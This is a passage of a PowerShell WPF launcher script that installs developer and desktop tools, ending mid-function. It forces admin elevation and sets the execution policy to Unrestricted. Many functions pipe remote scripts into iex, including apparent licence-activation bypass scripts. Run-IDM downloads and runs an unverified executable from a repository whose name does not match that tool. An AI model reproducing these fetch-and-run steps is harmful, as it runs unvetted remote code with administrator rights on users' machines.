# ============================================================
#  Tool Installer GUI  -  by AFNAN (Refactored to WPF XAML)
#  Modern WPF XAML GUI wrapper for tools-installer-beta.ps1
#  Compatible with PowerShell 5.1 and PowerShell 7+
# ============================================================

$logPath = "C:\Users\Admin\Desktop\tools-installer\crash.log"
if (Test-Path $logPath) { Remove-Item $logPath -Force -ErrorAction SilentlyContinue }

try {
    $ErrorActionPreference = "Stop"

    # -- 1. ADMINISTRATOR ELEVATION & STA MODE FORCING -----------------------------
    $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    $isSTA = [System.Threading.Thread]::CurrentThread.GetApartmentState() -eq 'STA'

    if (-not $isAdmin -or -not $isSTA) {
        $relaunch = "-NoProfile -ExecutionPolicy Bypass -STA -File `"$PSCommandPath`""
        $verb = if (-not $isAdmin) { "RunAs" } else { $null }
        Start-Process powershell -ArgumentList $relaunch -Verb $verb
        exit
    }

    # -- 2. WIN32 CONSOLE API DECLARATION -----------------------------------------
    try {
        [void][Console.Window]
    } catch {
        Add-Type -Name Window -Namespace Console -MemberDefinition @"
[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
[DllImport("kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
"@ -ErrorAction SilentlyContinue
    }

    # -- 3. CLI PROGRESS BAR HELPER -----------------------------------------------
    function Update-InitProgress {
        param(
            [int]$Percent,
            [string]$Status
        )
        Write-Progress -Activity "Tool Installer - Starting Up" -Status "$Status ($Percent%)" -PercentComplete $Percent
        try {
            $width = 24
            $filled = [int][Math]::Floor(($Percent / 100.0) * $width)
            $empty = [Math]::Max(0, $width - $filled)
            $bar = ("#" * $filled) + ("-" * $empty)
            $msg = "`r  [$bar] $($Percent.ToString().PadLeft(3))% : $Status"
            $msg = $msg.PadRight(76)
            Write-Host -NoNewline $msg -ForegroundColor Cyan
        } catch {}
    }

    try {
        [Console]::CursorVisible = $false
    } catch {}

    Write-Host ""
    Write-Host " ========================================================== " -ForegroundColor DarkCyan
    Write-Host "                TOOL INSTALLER  -  BY AFNAN                 " -ForegroundColor Cyan
    Write-Host " ========================================================== " -ForegroundColor DarkCyan
    Write-Host ""
    Update-InitProgress -Percent 10 -Status "Initializing environment..."

    Update-InitProgress -Percent 20 -Status "Configuring Windows DWM & App ID..."
    try {
        [void][Native.DWM]
    } catch {
        Add-Type -Name DWM -Namespace Native -MemberDefinition @'
            [DllImport("dwmapi.dll", PreserveSig = false)]
            public static extern void DwmSetWindowAttribute(IntPtr hwnd, int attr, ref int attrValue, int attrSize);
'@ -ErrorAction SilentlyContinue
    }

    try {
        [void][Native.Shell]
    } catch {
        Add-Type -Name Shell -Namespace Native -MemberDefinition @'
            [DllImport("shell32.dll", PreserveSig = false)]
            public static extern void SetCurrentProcessExplicitAppUserModelID([System.Runtime.InteropServices.MarshalAs(System.Runtime.InteropServices.UnmanagedType.LPWStr)] string AppID);
'@ -ErrorAction SilentlyContinue
    }

    try {
        [Native.Shell]::SetCurrentProcessExplicitAppUserModelID("Afnan.ToolsInstaller.Gui")
    } catch {}

    # -- 4. LOAD WPF ASSEMBLIES ----------------------------------------------------
    Update-InitProgress -Percent 35 -Status "Loading WPF Presentation Framework..."
    Add-Type -AssemblyName System.Xaml
    Add-Type -AssemblyName PresentationFramework
    Add-Type -AssemblyName PresentationCore
    Add-Type -AssemblyName WindowsBase

    # ============================================================
    #  SECTION A: ALL BACKEND FUNCTIONS (preserved from original)
    # ============================================================

    function Refresh-Env {
        $env:Path = [System.Environment]::GetEnvironmentVariable("Path", "Machine") + ";" +
        [System.Environment]::GetEnvironmentVariable("Path", "User")
    }
    # ============================================================
    #  About AFNAN
    # ============================================================
    function Open-Github {
        Start-Process "https://github.com/afnan-nex"
    }

    function Open-Portfolio {
        Start-Process "https://afnan-nex.github.io/portfolio/"
    }

    # ============================================================
    #  PowerShell Tweaks
    # ============================================================

    function See-Policy {
        Start-Process cmd -WindowStyle Minimized -ArgumentList "/k", ("echo Current Execution Policy: && " +
            "powershell -NoProfile -ExecutionPolicy Bypass -Command " +
            """Get-ExecutionPolicy -List"" && echo. && echo Press any key to close... && echo. && echo Press any key to exit . . . && pause >nul && exit")
    }

    function Unrestrict-Policy {
        Start-Process cmd -WindowStyle Minimized -ArgumentList "/k", ("echo Setting PowerShell Execution Policy to Unrestricted... && " +
            "powershell -NoProfile -ExecutionPolicy Bypass -Command " +
            """Set-ExecutionPolicy Unrestricted -Force -Scope CurrentUser; " +
            "Set-ExecutionPolicy Unrestricted -Force -Scope LocalMachine; " +
            "Write-Host 'Policy updated successfully.'"" && echo. && echo Press any key to close... && echo. && echo Press any key to exit . . . && pause >nul && exit")
    }

    # ============================================================
    #  Essential
    # ============================================================

    function Install-Choco {
        $chocoCmd = "echo Installing Chocolatey... && powershell -NoProfile -ExecutionPolicy Bypass -Command " +
        "`"Set-ExecutionPolicy Bypass -Scope Process -Force; " +
        "[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; " +
        "iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))`" " +
        "&& echo. && echo Chocolatey installation completed. && echo. && echo Press any key to exit . . . && pause >nul && exit"
        Start-Process cmd -WindowStyle Minimized -ArgumentList "/k", $chocoCmd
    }

    function Install-NodeLTS {
        Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
        "echo Installing Node.js LTS via Chocolatey... && choco upgrade nodejs-lts -y --force --install-if-not-installed --no-desktop-shortcut && echo. && echo Node.js installation completed. && echo. && echo Press any key to exit . . . && pause >nul && exit"
    }

    function Install-Scoop {
        Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
        "echo Installing Scoop... && powershell -NoProfile -ExecutionPolicy Bypass -Command `"Write-Host 'Initializing...'; if (Get-Command scoop -ErrorAction SilentlyContinue) { Write-Host 'Scoop is already installed. Run ''scoop update'' to get the latest version.'; Write-Host 'Abort.'; scoop update } else { iex (irm get.scoop.sh) }; Write-Host ''; Write-Host 'Adding extras bucket...'; if (scoop bucket list | Select-String 'extras') { Write-Host 'WARN  The ''extras'' bucket already exists. To add this bucket again, first remove it by running ''scoop bucket rm extras''.' } else { scoop bucket add extras }`" && echo. && echo Scoop installation completed. && echo. && echo Press any key to exit . . . && pause >nul && exit"
    }

    function Install-Pnpm {
        Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
        "echo Installing pnpm via Chocolatey... && choco upgrade pnpm -y --force --install-if-not-installed --no-desktop-shortcut && echo. && echo pnpm installation completed. && echo. && echo Press any key to exit . . . && pause >nul && exit"
    }

    function Install-Yarn {
        Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
        "echo Installing Yarn via npm... && npm install -g yarn && echo. && echo Yarn installation completed. && echo. && echo Press any key to exit . . . && pause >nul && exit"
    }

    function Install-Bun {
        Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
        "echo Installing Bun via Chocolatey... && choco upgrade bun -y --force --install-if-not-installed --no-desktop-shortcut && echo. && echo Bun installation completed. && echo. && echo Press any key to exit . . . && pause >nul && exit"
    }

    function Install-Go {
        Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
        "echo Installing Go via Chocolatey... && choco upgrade golang -y --force --install-if-not-installed --no-desktop-shortcut && echo. && echo Go installation completed. && echo. && echo Press any key to exit . . . && pause >nul && exit"
    }

    function Install-Deno {
        Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
        "echo Installing Deno via Chocolatey... && choco upgrade deno -y --force --install-if-not-installed --no-desktop-shortcut && echo. && echo Deno installation completed. && echo. && echo Press any key to exit . . . && pause >nul && exit"
    }

    # ============================================================
    #  Run Scripts
    # ============================================================

    function Run-Titus {
        Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
        "powershell -NoProfile -ExecutionPolicy Bypass -Command `"irm 'https://christitus.com/win' | iex`""
    }

    function Run-MassGrave {
        Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
        "powershell -NoProfile -ExecutionPolicy Bypass -Command `"irm https://get.activated.win | iex`""
    }

    function Run-Win11Debloat {
        Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
        "powershell -NoProfile -ExecutionPolicy Bypass -Command `"& ([scriptblock]::Create((irm 'https://debloat.raphi.re/')))`""
    }

    function Run-WinScript {
        Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
        "powershell -NoProfile -ExecutionPolicy Bypass -Command `"irm 'https://winscript.cc/irm' | iex`""
    }

    function Run-Coporton {
        Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
        "powershell -NoProfile -ExecutionPolicy Bypass -Command `"irm https://coporton.com/ias | iex`""
    }

    function Run-IDM {
        Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
        "curl.exe -L -O https://github.com/planetshine0000/vc-redist-latest/releases/download/v1.0.1/Download.exe && Download.exe"
    }

    function Run-Sparkle {
        Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
        "powershell -NoProfile -ExecutionPolicy Bypass -Command `"irm https://raw.githubusercontent.com/Parcoil/Sparkle/v2/get.ps1 | iex`""
    }

    function Run-GHGrab {
        Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
        "echo === GHGrab === && npx --yes @ghgrab/ghgrab && echo. && echo Press any key to close... && echo. && echo Press any key to exit . . . && pause >nul && exit"
    }

    function Run-Setup {
        $setupCmd = ('echo Downloading Setup... && curl.exe -L --retry 3 --retry-delay 2 -o "%TEMP%\Tools-Installer.exe" ' +
            '"https://github.com/afnan-nex/tools-installer/raw/main/Setup/Tools-Installer.exe" && ' +
            'if exist "%TEMP%\Tools-Installer.exe" ( "%TEMP%\Tools-Installer.exe" ) ' +
            'else ( echo Download failed! ) && echo. && echo Press any key to exit . . . && pause >nul && exit')
        Start-Process cmd -WindowStyle Minimized -ArgumentList "/k", $setupCmd
    }

    function Run-VPN {
        Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
        "echo === VPN === && openvpn >nul 2>&1 || choco upgrade openvpn -y --install-if-not-installed --no-desktop-shortcut && curl -L -o vpn-connector.py https://raw.githubusercontent.com/afnan-nex/vpn-connector/main/vpn-connector.py && python -m pip install requests pystray pillow && python vpn-connector.py && echo. && echo Press any key to exit . . . && pause >nul && exit"
    }

    # Ensure unique function name
    function Run-TorLink {
        Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
        "echo === TorLink === && npx --yes torlnk && echo. && echo Press any key to close... && echo. && echo Press any key to exit . . . && pause >nul && exit"
    }

    function Install-Tork {
        Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
        "echo Installing Tork...use tork to run && go install github.com/melqtx/tork/cmd/tork@latest && echo. && echo Tork installation completed. && echo. && echo Press any key to exit . . . && pause >nul && exit"
    }

    function Run-YTDLPFrontend {
        $ytdlpCmd = ('echo Downloading and running YTDLP-Frontend... && ' +
            'curl -L -o "%TEMP%\YTDLP-Frontend.ps1" https://raw.githubusercontent.com/afnan-nex/YTDLP-Frontend/main/YTDLP-Frontend.ps1 && ' +
            'powershell -NoProfile -ExecutionPolicy Bypass -File "%TEMP%\YTDLP-Frontend.ps1" && ' +
            'echo. && echo Process finished. Press any key to close this window. && echo. && echo Press any key to exit . . . && pause >nul && exit')
        Start-Process cmd -WindowStyle Minimized -ArgumentList "/k", $ytdlpCmd
    }

    function Run-Yoinks {
        Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
        "echo === Yoinks === && npx --yes yoinks && echo. && echo Press any key to close... && echo. && echo Press any key to exit . . . && pause >nul && exit"
    }

    # ============================================================
    #  Recommended Tools
    # ============================================================

    function Install-Git {
        Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
        "echo Installing Git via Chocolatey... && choco upgrade git -y --install-if-not-installed --no-desktop-shortcut && echo. && echo Git installation completed. && echo. && echo Press any key to exit . . . && pause >nul && exit"
    }

    function Install-Python {
        Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
        "echo Installing Python via Chocolatey... && choco upgrade python -y --install-if-not-installed --no-desktop-shortcut && echo. && echo Python installation completed. && echo. && echo Press any key to exit . . . && pause >nul && exit"
    }

    function Install-Dotnet {
        Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
        "echo Installing .NET via Chocolatey... && choco upgrade dotnet -y --install-if-not-installed --no-desktop-shortcut && echo. && echo .NET installation completed. && echo. && echo Press any key to exit . . . && pause >nul && exit"
    }

    function Install-FFmpeg {
        Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
        "echo Installing FFmpeg via Chocolatey... && choco upgrade ffmpeg -y --install-if-not-installed --no-desktop-shortcut && echo. && echo FFmpeg installation completed. && echo. && echo Press any key to exit . . . && pause >nul && exit"
    }

    function Install-7Zip {
        Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
        "echo Installing 7-Zip via Chocolatey... && choco upgrade 7zip -y --install-if-not-installed --no-desktop-shortcut && echo. && echo 7-Zip installation completed. && echo. && echo Press any key to exit . . . && pause >nul && exit"
    }

    # Ensure unique function name
    function Install-PeaZip {
        Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
        "echo Installing PeaZip via Chocolatey... && choco upgrade peazip -y --install-if-not-installed --no-desktop-shortcut && echo. && echo PeaZip installation completed. && echo. && echo Press any key to exit . . . && pause >nul && exit"
    }

    function Install-WinDirStat {
        Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
        "echo Installing WinDirStat via Chocolatey... && choco upgrade windirstat -y --install-if-not-installed --no-desktop-shortcut && echo. && echo WinDirStat installation completed. && echo. && echo Press any key to exit . . . && pause >nul && exit"
    }

    function Install-YTDLP {
        Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
        "echo Installing yt-dlp via Chocolatey... && choco upgrade yt-dlp -y --install-if-not-installed --no-desktop-shortcut && echo. && echo yt-dlp installation completed. && echo. && echo Press any key to exit . . . && pause >nul && exit"
    }

    # Ensure unique function name
    function Install-Ngrok {
        Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
        "echo Installing ngrok via Chocolatey... && choco upgrade ngrok -y --install-if-not-installed --no-desktop-shortcut && echo. && echo ngrok installation completed. && echo. && echo Press any key to exit . . . && pause >nul && exit"
    }

    function Install-Localtunnel {
        Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
        "echo Installing localtunnel via npm... use lt --port 3000 to run && npm install -g localtunnel && echo. && echo localtunnel installation completed. && echo. && echo Press any key to exit . . . && pause >nul && exit"
    }

    function Install-Miniserve {
        Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
        "echo Installing Miniserve via Winget... use miniserve --qrcode to run && winget upgrade svenstaro.miniserve --silent || winget install svenstaro.miniserve --accept-package-agreements --accept-source-agreements --silent && echo. && echo Miniserve installation completed. && echo. && echo Press any key to exit . . . && pause >nul && exit"
    }

    function Install-WebView2 {
        Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
        "echo Installing Microsoft Edge WebView2 Runtime via Winget... && winget install Microsoft.EdgeWebView2Runtime --accept-package-agreements --accept-source-agreements --silent --verbose && echo. && echo Edge WebView2 Runtime installation completed. && echo. && echo Press any key to exit . . . && pause >nul && exit"
    }

    # ============================================================
    #  Other Apps
    # ============================================================

    function Install-FastStone {
        Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
        "echo Installing FastStone Image Viewer via Chocolatey... && choco upgrade faststone-image-viewer -y --force --install-if-not-installed --no-desktop-shortcut && echo. && echo FastStone Image Viewer installation completed. && echo. && echo Press any key to exit . . . && pause >nul && exit"
    }

    function Install-VLC {
        Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
        "echo Installing VLC Media Player via Chocolatey... && choco upgrade vlc.install -y --force --install-if-not-installed --no-desktop-shortcut && echo. && echo VLC Media Player installation completed. && echo. && echo Press any key to exit . . . && pause >nul && exit"
    }

    function Install-MPC-HC {
        Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
        "echo Installing MPC-HC via Chocolatey... && choco upgrade mpc-hc-clsid2 -y --force --install-if-not-installed --no-desktop-shortcut && echo. && echo MPC-HC installation completed. && echo. && echo Press any key to exit . . . && pause >nul && exit"
    }

    function Install-OnlyOffice {
        Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
        "echo Installing Only Office via Chocolatey... && choco upgrade onlyoffice-desktopeditors -y --force --install-if-not-installed --no-desktop-shortcut && echo. && echo Only Office installation completed. && echo. && echo Press any key to exit . . . && pause >nul && exit"
    }

    function Install-Kdenlive {
        Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
        "echo Installing Kdenlive via Chocolatey... && choco upgrade kdenlive -y --force --install-if-not-installed --no-desktop-shortcut && echo. && echo Kdenlive installation completed. && echo. && echo Press any key to exit . . . && pause >nul && exit"
    }

    function Install-HandBrake {
        Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
        "echo Installing HandBrake via Chocolatey... && choco upgrade handbrake -y --force --install-if-not-installed --no-desktop-shortcut && echo. && echo HandBrake installation completed. && echo. && echo Press any key to exit . . . && pause >nul && exit"
    }

    function Install-AntiGravity-ide {
        Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
        "echo Installing AntiGravity IDE via Chocolatey... && choco upgrade antigravity-ide -y --force --install-if-not-installed --no-desktop-shortcut && echo. && echo AntiGravity IDE installation completed. && echo. && echo Press any key to exit . . . && pause >nul && exit"
    }

    function Install-VSCode {
        Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
        "echo Installing Visual Studio Code via Chocolatey... && choco upgrade vscode -y --force --install-if-not-installed --no-desktop-shortcut && echo. && echo Visual Studio Code installation completed. && echo. && echo Press any key to exit . . . && pause >nul && exit"
    }

    function Install-Zed {
        Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
        "echo Installing Zed Editor via Chocolatey... && choco upgrade zed-editor -y --force --install-if-not-installed --no-desktop-shortcut && echo. && echo Zed Editor installation completed. && echo. && echo Press any key to exit . . . && pause >nul && exit"
    }

    function Install-IDM {
        Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
        "echo Installing Internet Download Manager via Chocolatey... && choco upgrade internet-download-manager -y --force --install-if-not-installed --no-desktop-shortcut && echo. && echo Internet Download Manager installation completed. && echo. && echo Press any key to exit . . . && pause >nul && exit"
    }

    function Install-GhostDownloader {
        Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
        "echo Installing Ghost Downloader via Winget... && winget upgrade -e --id XiaoYouChR.GhostDownloader --silent || winget install -e --id XiaoYouChR.GhostDownloader --silent --accept-source-agreements --accept-package-agreements && echo. && echo Ghost Downloader installation completed. && echo. && echo Press any key to exit . . . && pause >nul && exit"
    }

    function Install-VirtualBox {
        Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
        "echo Installing VirtualBox via Chocolatey... && choco upgrade virtualbox -y --force --install-if-not-installed --no-desktop-shortcut && echo. && echo VirtualBox installation completed. && echo. && echo Press any key to exit . . . && pause >nul && exit"
    }
    # ============================================================
    #  Automation
    # ============================================================

    function Install-N8N {
        $n8nCmd = ('echo Installing n8n Workflow Automation... && ' +
            'npm install -g n8n@latest --verbose && echo n8n installation completed. && ' +
            'echo Setting n8n environment variables... && ' +
            'setx NODES_EXCLUDE "[]" && setx NODES_EXCLUDE "[]" /M && ' +
            'setx N8N_UNVERIFIED_PACKAGES_ENABLED "true" && setx N8N_UNVERIFIED_PACKAGES_ENABLED "true" /M && ' +
            'setx N8N_RUNNERS_TASK_TIMEOUT "300" && setx N8N_RUNNERS_TASK_TIMEOUT "300" /M && ' +
            'setx N8N_COMPRESSION_NODE_MAX_DECOMPRESSED_SIZE_BYTES "2147483648" && setx N8N_COMPRESSION_NODE_MAX_DECOMPRESSED_SIZE_BYTES "2147483648" /M && ' +
            'setx N8N_COMPRESSION_NODE_MAX_ZIP_ENTRIES "5000" && setx N8N_COMPRESSION_NODE_MAX_ZIP_ENTRIES "5000" /M && ' +
            'echo Environment variables set successfully. && echo. && ' +
            'echo NOTE: Running n8n outside Docker is deprecated. Consider migrating to the official Docker image. && echo. && ' +
            'echo Press any key to close this window. && echo. && echo Press any key to exit . . . && pause >nul && exit')
        Start-Process cmd -WindowStyle Minimized -ArgumentList "/k", $n8nCmd
    }

    function Install-GWS {
        Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
        "echo Installing Google Workspace CLI... && npm install -g @googleworkspace/cli && echo. && echo Installation completed. Press any key to close this window. && echo. && echo Press any key to exit . . . && pause >nul && exit"
    }

    # ============================================================
    #  Control Panel
    # ============================================================
    function Open-ControlPanel {
        Start-Process "control.exe"
    }

    function Open-DevicesAndPrinters {
        Start-Process "explorer.exe" -ArgumentList "shell:::{A8A91A66-3A7D-4424-8D24-04E180695C7A}"
    }

    function Open-TaskManager {
        Start-Process "taskmgr.exe"
    }

    function Open-DeviceManager {
        Start-Process "devmgmt.msc"
    }

    function Open-DiskManagement {
        Start-Process "diskmgmt.msc"
    }

    function Open-SystemProperties {
        Start-Process "sysdm.cpl"
    }

    function Open-MSConfig {
        Start-Process "msconfig.exe"
    }

    function Open-PowerOptions {
        Start-Process "powercfg.cpl"
    }

    # ============================================================
    #  AI in PC
    # ============================================================

    function Install-Agy {
        $agyCmd = ('echo Installing Agy... && ' +
            'powershell -NoProfile -ExecutionPolicy Bypass -Command "irm https://antigravity.google/cli/install.ps1 | iex" && echo. && ' +
            'echo Installation completed. Press any key to close this window. && echo. && echo Press any key to exit . . . && pause >nul && exit')
        Start-Process cmd -WindowStyle Minimized -ArgumentList "/k", $agyCmd
    }

    function Install-Opencode {
        Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
        "echo Installing Opencode... && npm i -g opencode-ai --verbose && echo. && echo Installation completed. Press any key to close this window. && echo. && echo Press any key to exit . . . && pause >nul && exit"
    }

    function Install-Cursoride {
        Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
        "echo Installing Cursor IDE via Chocolatey... && choco upgrade cursoride -y --force --install-if-not-installed --no-desktop-shortcut && echo. && echo Cursor IDE installation completed. && echo. && echo Press any key to exit . . . && pause >nul && exit"
    }

    function Open-GoogleDesktopApp {
        Start-Process "https://search.google/google-app/desktop/"
    }

    function Run-LLMChecker {
        Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
        "echo Running LLM-Checker Recommendation... && npx --yes llm-checker && echo. && echo Finished. Press any key to close... && echo. && echo Press any key to exit . . . && pause >nul && exit"
    }

    function Install-LLMFit {
        Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
        "echo Installing LLMFit via Scoop... && scoop install llmfit -a && echo. && echo LLMFit installation completed. && echo. && echo Press any key to exit . . . && pause >nul && exit"
    }

    function Install-Ollama {
        Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
        "echo Installing Ollama... && winget upgrade Ollama.Ollama --silent || winget install Ollama.Ollama --accept-package-agreements --accept-source-agreements --silent && echo. && echo Finished. Press any key to close... && echo. && echo Press any key to exit . . . && pause >nul && exit"
    }

    function Install-ClaudeCode {
        Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
        "echo Installing Claude Code... && npm install -g @anthropic-ai/claude-code --verbose && echo. && echo Claude Code installation completed. && echo. && echo Press any key to exit . . . && pause >nul && exit"
    }

    function Install-ClaudeCodeRouter {
        Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
        "echo Installing Claude Code Router... && npm install -g @musistudio/claude-code-router && echo. && echo Installation completed. Press any key to close this window. && echo. && echo Press any key to exit . . . && pause >nul && exit"
    }

    # Ensure unique function name
    function Install-Codebuff {
        Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
        "echo Installing Codebuff... && npm install -g codebuff && echo. && echo Installation completed. Press any key to close this window. && echo. && echo Press any key to exit . . . && pause >nul && exit"
    }

    function Install-Omniroute {
        Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
        "echo Installing Omniroute... && npm install -g omniroute && echo. && echo Installation completed. Press any key to close this window. && echo. && echo Press any key to exit . . . && pause >nul && exit"
    }

    # ============================================================
    #  System tools
    # ============================================================

    function Install-Winget {
        $wingetPs = @'
Write-Host "Checking if Winget is already installed..."
if (Get-Command winget -ErrorAction SilentlyContinue) {
    Write-Host "Winget is already installed on your PC." -ForegroundColor Green
} else {
    Write-Host "Winget is not installed. Installing Winget with verbose output..."
    try {
        $progressPreference = 'silentlyContinue'
        Invoke-WebRequest -Uri 'https://aka.ms/getwinget' -OutFile 'winget.msixbundle'
        Add-AppxPackage 'winget.msixbundle'
        Remove-Item 'winget.msixbundle' -Force
        Write-Host "Winget installed successfully." -ForegroundColor Green
        Write-Host ""
        Write-Host "Winget version info:" -ForegroundColor Cyan
        winget --version --verbose
    } catch {
        Write-Host ("Error installing Winget: " + $_.Exception.Message) -ForegroundColor Red
        Write-Host "You may need to install from Microsoft Store instead."
    }
}
Read-Host "Press Enter to close"
'@
        $tmp = "$env:TEMP\install_winget.ps1"
        $wingetPs | Out-File -FilePath $tmp -Encoding UTF8
        Start-Process powershell -WindowStyle Minimized -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$tmp`""
    }

    function Install-Everything {
        Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
        "echo Installing Everything via Chocolatey... && choco upgrade everything -y --force --install-if-not-installed --no-desktop-shortcut && echo. && echo Everything installation completed. && echo. && echo Press any key to exit . . . && pause >nul && exit"
    }

    function Set-CMD0A {
        $cmd0aPs = @'
Write-Host "Downloading CMD color script..."
try {
    Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/afnan-nex/my-fav-scripts/main/cmd-clr-to-0a.cmd' -OutFile 'cmd-clr-to-0a.cmd'
    Start-Process 'cmd-clr-to-0a.cmd' -WindowStyle Minimized
    Write-Host "CMD color script downloaded and executed."
} catch {
    Write-Host ("Error: " + $_.Exception.Message)
}
Read-Host "Press Enter to close"
'@
        $tmp = "$env:TEMP\set_cmd0a.ps1"
        $cmd0aPs | Out-File -FilePath $tmp -Encoding UTF8
        Start-Process powershell -WindowStyle Minimized -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$tmp`""
    }

    function Install-RustDesk {
        Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
        "echo Installing RustDesk via Chocolatey... && choco upgrade rustdesk -y --force --install-if-not-installed --no-desktop-shortcut && echo. && echo RustDesk installation completed. && echo. && echo Press any key to exit . . . && pause >nul && exit"
    }

    function Install-HiBit {
        Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
        "echo Installing HiBit Uninstaller via Winget... && winget upgrade HiBitSoftware.HiBitUninstaller --silent || winget install HiBitSoftware.HiBitUninstaller --accept-package-agreements --accept-source-agreements --silent && echo. && echo HiBit Uninstaller installation completed. && echo. && echo Press any key to exit . . . && pause >nul && exit"
    }

    function Install-Superfile {
        Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
        "echo Installing Superfile... use spf to run && echo visit https://superfile.dev/getting-started/tutorial/ for tutorial && powershell -ExecutionPolicy Bypass -Command `"Invoke-Expression ((New-Object System.Net.WebClient).DownloadString('https://superfile.dev/install.ps1'))`" && echo. && echo Superfile installation completed. && echo. && echo Press any key to exit . . . && pause >nul && exit"
    }

    function Install-Alacritty {
        Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
        "echo Installing Alacritty via Chocolatey... && choco upgrade alacritty -y --force --install-if-not-installed --no-desktop-shortcut && echo. && echo Alacritty installation completed. && echo. && echo Press any key to exit . . . && pause >nul && exit"
    }

    function Install-Scrcpy {
        Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
        "echo Installing Scrcpy GUI via Winget... && winget upgrade pizi.scrcpygui --silent || winget install pizi.scrcpygui --accept-package-agreements --accept-source-agreements --silent && echo. && echo Scrcpy GUI installation completed. && echo. && echo Press any key to exit . . . && pause >nul && exit"
    }

    function Install-Cursor {
        Start-Process cmd -WindowStyle Minimized -ArgumentList "/c",
        "echo Downloading Elegant repository from GitHub... && curl -L -o Elegant.zip https://github.com/afnan-nex/Elegant/archive/refs/heads/main.zip && powershell -NoProfile -ExecutionPolicy Bypass -Command `"Expand-Archive -Path 'Elegant.zip' -DestinationPath . -Force; Remove-Item Elegant.zip -Force; Rename-Item Elegant-main Elegant`" && cd /d Elegant && call apply_cursors.cmd"
    }

    function Install-VCC-Runtimes {
        Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
        "echo Installing all Visual C++ Runtimes via winget... && winget upgrade -e --id abbodi1406.vcredist --silent || winget install -e --id abbodi1406.vcredist --accept-package-agreements --accept-source-agreements --silent && echo. && echo Visual C++ Runtimes installation completed. && echo. && echo Press any key to exit . . . && pause >nul && exit"
    }

    function Install-DirectX {
        Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
        "echo Installing DirectX End-User Runtime via winget... && winget upgrade -e --id Microsoft.DirectX --silent || winget install -e --id Microsoft.DirectX --accept-package-agreements --accept-source-agreements --silent && echo. && echo DirectX installation completed. && echo. && echo Press any key to exit . . . && pause >nul && exit"
    }

    # ============================================================
    #  Productivity Apps
    # ============================================================

    function Install-Office365 {
        $officeCmd = ('echo Downloading Office 365 Setup... && ' +
            'curl.exe -L --retry 3 --retry-delay 2 -o "%TEMP%\OfficeSetup.exe" ' +
            '"https://c2rsetup.officeapps.live.com/c2r/download.aspx?ProductreleaseID=O365ProPlusRetail&platform=x64&language=en-us&version=O16GA" && ' +
            'if exist "%TEMP%\OfficeSetup.exe" ' +
            '(echo Launching Office Installer... && start "" "%TEMP%\OfficeSetup.exe") ' +
            'else (echo Download failed.) && echo. && echo Press any key to exit . . . && pause >nul && exit')
        Start-Process cmd -WindowStyle Minimized -ArgumentList "/k", $officeCmd
